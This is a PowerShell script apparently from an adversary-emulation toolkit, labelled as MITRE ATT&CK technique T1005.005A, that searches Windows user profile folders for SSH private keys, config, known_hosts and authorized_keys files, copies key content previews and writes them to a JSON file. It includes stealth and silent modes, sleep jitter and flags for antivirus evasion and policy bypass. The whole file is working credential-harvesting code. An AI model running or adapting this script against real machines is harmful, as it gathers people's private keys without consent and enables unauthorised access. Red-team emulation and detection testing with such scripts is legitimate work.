# T1005.005A - SSH Keys Extraction
# MITRE ATT&CK Enterprise - TA0009 - Collection
# ATOMIC ACTION: extract SSH private keys from user directories ONLY
# Platform: Windows | Privilege: User | Type: Atomic Package

param()

function Get-Configuration {
    # Validation des pr  conditions contractuelles Deputy avec granularit   maximale Windows
    $config = @{
        # Configuration de base universelle
        "OUTPUT_BASE" = if ($env:T1005_005A_OUTPUT_BASE) { $env:T1005_005A_OUTPUT_BASE } else { "$env:TEMP\mitre_results" }
        "TIMEOUT" = if ($env:T1005_005A_TIMEOUT) { [int]$env:T1005_005A_TIMEOUT } else { 300 }
        "DEBUG_MODE" = $env:T1005_005A_DEBUG_MODE -eq "true"
        "STEALTH_MODE" = $env:T1005_005A_STEALTH_MODE -eq "true"
        "VERBOSE_LEVEL" = if ($env:T1005_005A_VERBOSE_LEVEL) { [int]$env:T1005_005A_VERBOSE_LEVEL } else { 1 }
        
        # Adaptation Windows sp  cifique
        "OS_TYPE" =  "windows"
        "SHELL_TYPE" =  "powershell"
        "EXEC_METHOD" = if ($env:T1005_005A_EXEC_METHOD) { $env:T1005_005A_EXEC_METHOD } else { "native" }
        
        # Gestion d'erreur sophistiqu  e
        "RETRY_COUNT" = if ($env:T1005_005A_RETRY_COUNT) { [int]$env:T1005_005A_RETRY_COUNT } else { 3 }
        "RETRY_DELAY" = if ($env:T1005_005A_RETRY_DELAY) { [int]$env:T1005_005A_RETRY_DELAY } else { 5 }
        "FALLBACK_MODE" = if ($env:T1005_005A_FALLBACK_MODE) { $env:T1005_005A_FALLBACK_MODE } else { "simulate" }
        
        # Policy-awareness Windows (MDM/GPO/EDR)
        "POLICY_CHECK" = if ($env:T1005_005A_POLICY_CHECK) { $env:T1005_005A_POLICY_CHECK -eq "true" } else { $true }
        "POLICY_BYPASS" = $env:T1005_005A_POLICY_BYPASS -eq "true"
        "POLICY_SIMULATE" = if ($env:T1005_005A_POLICY_SIMULATE) { $env:T1005_005A_POLICY_SIMULATE -eq "true" } else { $false }
        
        # Variables sp  cialis  es
        "OUTPUT_MODE" = if ($env:T1005_005A_OUTPUT_MODE) { $env:T1005_005A_OUTPUT_MODE } else { "simple" }
        "SILENT_MODE" = $env:T1005_005A_SILENT_MODE -eq "true"
        
        # Defense Evasion Windows
        "OBFUSCATION_LEVEL" = if ($env:T1005_005A_OBFUSCATION_LEVEL) { [int]$env:T1005_005A_OBFUSCATION_LEVEL } else { 0 }
        "AV_EVASION" = $env:T1005_005A_AV_EVASION -eq "true"
        "SANDBOX_DETECTION" = if ($env:T1005_005A_SANDBOX_DETECTION) { $env:T1005_005A_SANDBOX_DETECTION -eq "true" } else { $true }
        "SLEEP_JITTER" = if ($env:T1005_005A_SLEEP_JITTER) { [int]$env:T1005_005A_SLEEP_JITTER } else { 0 }
        
        # Telemetry
        "ECS_VERSION" = if ($env:T1005_005A_ECS_VERSION) { $env:T1005_005A_ECS_VERSION } else { "8.0" }
        "CORRELATION_ID" = if ($env:T1005_005A_CORRELATION_ID) { $env:T1005_005A_CORRELATION_ID } else { "auto" }
    }
    
    # Auto-g  n  ration correlation ID pour cha  nage DAG
    if ($Config.CORRELATION_ID -eq "auto") {
        $Config.CORRELATION_ID = "T1005_005A_" + (Get-Date -Format "yyyyMMdd_HHmmss") + "_" + (Get-Random -Maximum 9999)
    }
    
    return $config
}

function Invoke-MicroTechniqueAction {
    param([hashtable]$Config)
    
    # ATOMIC ACTION: extract SSH private keys from user directories ONLY
    if ($Config.VERBOSE_LEVEL -ge 1 -and -not $Config.STEALTH_MODE -and -not $Config.SILENT_MODE) {
        Write-Host "[INFO] Starting atomic extract SSH private keys from user directories..." -ForegroundColor Yellow
    }
    
    # Sleep jitter pour   vasion d  tection
    if ($Config.SLEEP_JITTER -gt 0) {
        Start-Sleep -Seconds (Get-Random -Maximum $Config.SLEEP_JITTER)
    }
    
    $results = @{
        "action" =  "extract_ssh_private_keys_from_user_directories"
        "technique_id" =  "T1005.005A"
        "timestamp" = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssZ")
        "hostname" = $env:COMPUTERNAME
        "username" = $env:USERNAME
        "privilege_level" =  "user"
    }
    
    try {
        # Prepare output directory
        $outputDir = Join-Path $Config.OUTPUT_BASE "t1005_005a"
        if (-not (Test-Path $outputDir)) {
            New-Item -Path $outputDir -ItemType Directory -Force | Out-Null
        }
        
        # Mode simulation policy-aware
        if ($Config.EXEC_METHOD -eq "simulate") {
            $results.results = @{
                "status" =  "success"
                "simulation" = $true
                "action_performed" =  "extract SSH private keys from user directories"
                "output_directory" = $outputDir
            }
            
            $results.postconditions = @{
                "action_completed" = $true
                "output_generated" = $false
                "policy_compliant" = $true
                "simulated" = $true
            }
            
            if ($Config.VERBOSE_LEVEL -ge 1 -and -not $Config.STEALTH_MODE -and -not $Config.SILENT_MODE) {
                Write-Host "[SIMULATE] extract SSH private keys from user directories simulated successfully" -ForegroundColor Yellow
            }
            
            return $results
        }
        
        # ATOMIC ACTION: Extract SSH private keys from user directories
        $sshKeysFound = @()
        $sshDirectories = @(
            "$env:USERPROFILE\.ssh",
            "$env:USERPROFILE\ssh",
            "$env:USERPROFILE\Documents\.ssh",
            "$env:USERPROFILE\AppData\Local\.ssh",
            "$env:USERPROFILE\AppData\Roaming\.ssh"
        )

        # Common SSH private key file patterns
        $sshKeyPatterns = @(
            "id_rsa",
            "id_ed25519",
            "id_ecdsa",
            "id_dsa",
            "*.pem",
            "*.key",
            "identity",
            "id_*"
        )

        $totalKeysFound = 0
        $directoriesScanned = 0

        foreach ($sshDir in $sshDirectories) {
            $directoriesScanned++

            if (Test-Path $sshDir) {
                if ($Config.VERBOSE_LEVEL -ge 2 -and -not $Config.STEALTH_MODE -and -not $Config.SILENT_MODE) {
                    Write-Host "[DEBUG] Scanning SSH directory: $sshDir" -ForegroundColor Cyan
                }

                try {
                    # Check for SSH config file
                    $sshConfigPath = Join-Path $sshDir "config"
                    if (Test-Path $sshConfigPath) {
                        $sshKeysFound += @{
                            "type" = "config_file"
                            "path" = $sshConfigPath
                            "size_bytes" = (Get-Item $sshConfigPath).Length
                            "last_modified" = (Get-Item $sshConfigPath).LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss")
                        }
                        $totalKeysFound++
                    }

                    # Check for known_hosts file
                    $knownHostsPath = Join-Path $sshDir "known_hosts"
                    if (Test-Path $knownHostsPath) {
                        $sshKeysFound += @{
                            "type" = "known_hosts"
                            "path" = $knownHostsPath
                            "size_bytes" = (Get-Item $knownHostsPath).Length
                            "last_modified" = (Get-Item $knownHostsPath).LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss")
                        }
                        $totalKeysFound++
                    }

                    # Search for private key files
                    foreach ($pattern in $sshKeyPatterns) {
                        $keyFiles = Get-ChildItem -Path $sshDir -Filter $pattern -File -ErrorAction SilentlyContinue
                        foreach ($keyFile in $keyFiles) {
                            # Skip public keys (.pub files)
                            if (-not $keyFile.Name.EndsWith(".pub")) {
                                $sshKeysFound += @{
                                    "type" = "private_key"
                                    "path" = $keyFile.FullName
                                    "filename" = $keyFile.Name
                                    "size_bytes" = $keyFile.Length
                                    "last_modified" = $keyFile.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss")
                                    "extension" = $keyFile.Extension
                                }
                                $totalKeysFound++

                                # Extract key content if it's a real private key (not too large)
                                if ($keyFile.Length -lt 10000) { # Limit to 10KB to avoid memory issues
                                    try {
                                        $keyContent = Get-Content $keyFile.FullName -Raw -ErrorAction SilentlyContinue
                                        if ($keyContent -and $keyContent.Contains("-----BEGIN")) {
                                            $sshKeysFound[-1]["content_preview"] = $keyContent.Substring(0, [Math]::Min(200, $keyContent.Length))
                                            $sshKeysFound[-1]["is_private_key"] = $true
                                        }
                                    } catch {
                                        $sshKeysFound[-1]["read_error"] = $_.Exception.Message
                                    }
                                }
                            }
                        }
                    }

                    # Check for authorized_keys file
                    $authorizedKeysPath = Join-Path $sshDir "authorized_keys"
                    if (Test-Path $authorizedKeysPath) {
                        $sshKeysFound += @{
                            "type" = "authorized_keys"
                            "path" = $authorizedKeysPath
                            "size_bytes" = (Get-Item $authorizedKeysPath).Length
                            "last_modified" = (Get-Item $authorizedKeysPath).LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss")
                        }
                        $totalKeysFound++
                    }

                } catch {
                    if ($Config.VERBOSE_LEVEL -ge 1 -and -not $Config.STEALTH_MODE -and -not $Config.SILENT_MODE) {
                        Write-Host "[WARNING] Error scanning directory $sshDir : $($_.Exception.Message)" -ForegroundColor Yellow
                    }
                }
            } else {
                if ($Config.VERBOSE_LEVEL -ge 2 -and -not $Config.STEALTH_MODE -and -not $Config.SILENT_MODE) {
                    Write-Host "[DEBUG] SSH directory not found: $sshDir" -ForegroundColor Gray
                }
            }
        }

        # Prepare results based on what was found
        $results.results = @{
            "status" =  if ($totalKeysFound -gt 0) { "success" } else { "no_keys_found" }
            "action_performed" =  "extract SSH private keys from user directories"
            "output_directory" = $outputDir
            "directories_scanned" = $directoriesScanned
            "total_ssh_items_found" = $totalKeysFound
            "ssh_items_found" = $sshKeysFound
            "ssh_directories_searched" = $sshDirectories
        }

        # Create detailed output file if keys were found
        if ($totalKeysFound -gt 0) {
            $outputFile = Join-Path $outputDir "ssh_keys_extracted.json"
            $sshKeysFound | ConvertTo-Json -Depth 10 | Out-File -FilePath $outputFile -Encoding UTF8
            $results.results["output_file"] = $outputFile
        }
        
        $results.postconditions = @{
            "action_completed" = $true
            "output_generated" = $true
            "policy_compliant" = $true
        }
        
        # Display appropriate message based on results
        if ($Config.VERBOSE_LEVEL -ge 1 -and -not $Config.STEALTH_MODE -and -not $Config.SILENT_MODE) {
            if ($totalKeysFound -gt 0) {
                Write-Host "[SUCCESS] SSH keys extraction completed: $totalKeysFound items found in $directoriesScanned directories" -ForegroundColor Green
            } else {
                Write-Host "[INFO] SSH keys extraction completed: No SSH keys found in $directoriesScanned directories scanned" -ForegroundColor Yellow
            }
        }
    }
    catch {
        $results.results = @{
            "status" =  "error"
            "error" = $_.Exception.Message
        }
        
        $results.postconditions = @{
            "action_completed" = $false
            "output_generated" = $false
            "policy_compliant" = $Config.EXEC_METHOD -ne "denied"
        }
        
        if ($Config.VERBOSE_LEVEL -ge 1 -and -not $Config.STEALTH_MODE -and -not $Config.SILENT_MODE) {
            Write-Error "extract SSH private keys from user directories failed: $($_.Exception.Message)"
        }
    }
    
    return $results
}

function Write-StandardizedOutput {
    param([hashtable]$Data, [hashtable]$Config)
    
    $outputDir = Join-Path $Config.OUTPUT_BASE "t1005_005a"
    if (-not (Test-Path $outputDir)) {
        New-Item -Path $outputDir -ItemType Directory -Force | Out-Null
    }
    
    # Mode stealth complet - aucune sortie si SILENT_MODE
    if ($Config.SILENT_MODE -and $Config.OUTPUT_MODE -eq "stealth") {
        return $outputDir
    }
    
    switch ($Config.OUTPUT_MODE) {
        "simple" {
            if ($Data.results.status -eq "success") {
                $simpleOutput = "SSH KEYS EXTRACTION "
                $simpleOutput += "`nAction: extract SSH private keys from user directories"
                $simpleOutput += "`nStatus: Success"
            } else {
                $simpleOutput = "extract SSH private keys from user directories failed: $($Data.results.error)"
            }
            
            if (-not $Config.SILENT_MODE) {
                Write-Output $simpleOutput
                $simpleOutput | Out-File -FilePath (Join-Path $outputDir "results_simple.txt") -Encoding UTF8
            }
        }
        
        "debug" {
            $jsonFile = Join-Path $outputDir "results_debug.json"
            $Data | ConvertTo-Json -Depth 10 | Out-File -FilePath $jsonFile -Encoding UTF8
            
            if ($Config.VERBOSE_LEVEL -ge 2 -and -not $Config.SILENT_MODE) {
                Write-Host "[DEBUG] Results written to: $jsonFile" -ForegroundColor Cyan
            }
        }
        
        "stealth" {
            if (-not $Config.SILENT_MODE) {
                $jsonFile = Join-Path $outputDir "results_stealth.json"
                $Data | ConvertTo-Json -Depth 10 | Out-File -FilePath $jsonFile -Encoding UTF8
            }
        }
    }
    
    return $outputDir
}

function Main {
    try {
        $Config = Get-Configuration
        $results = Invoke-MicroTechniqueAction -Config $config
        $outputPath = Write-StandardizedOutput -Data $results -Config $config
        
        # Validation des postconditions contractuelles Deputy
        if (-not $results.postconditions.action_completed -and $Config.EXEC_METHOD -ne "simulate") {
            throw "Postcondition failed: action not completed"
        }
        
        if ($Config.VERBOSE_LEVEL -ge 1 -and -not $Config.STEALTH_MODE -and -not $Config.SILENT_MODE) {
            Write-Host "[COMPLETE] T1005.005A atomic execution finished - Output: $outputPath" -ForegroundColor Green
        }
        
        return 0  # SUCCESS
    }
    catch {
        $errorMessage = $_.Exception.Message
        
        # Codes de retour explicites Deputy
        if ($errorMessage -like "*Precondition*") {
            if ($Config.VERBOSE_LEVEL -ge 1 -and -not $Config.SILENT_MODE) {
                Write-Error "SKIPPED_PRECONDITION: $errorMessage"
            }
            exit 2
        } 
        elseif ($errorMessage -like "*Policy*") {
            if ($Config.VERBOSE_LEVEL -ge 1 -and -not $Config.SILENT_MODE) {
                Write-Error "DENIED_POLICY: $errorMessage"
            }
            exit 3
        } 
        elseif ($errorMessage -like "*Postcondition*") {
            if ($Config.VERBOSE_LEVEL -ge 1 -and -not $Config.SILENT_MODE) {
                Write-Error "FAILED_POSTCONDITION: $errorMessage"
            }
            exit 4
        }
        else {
            if ($Config.VERBOSE_LEVEL -ge 1 -and -not $Config.SILENT_MODE) {
                Write-Error "FAILED: Micro-technique execution failed: $errorMessage"
            }
            exit 1
        }
    }
}

exit (Main)



